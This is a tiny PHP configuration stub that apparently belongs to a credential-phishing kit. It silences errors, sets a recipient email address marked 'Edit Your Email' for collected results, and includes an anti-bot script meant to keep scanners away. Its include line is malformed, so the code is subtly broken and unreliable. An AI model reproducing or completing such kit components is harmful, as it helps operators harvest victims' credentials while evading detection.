<?php

error_reporting(0);

$to = 'craftsman763@gmail.com'; // Edit Your Email


include(__DIR__).'/app/antibots.php';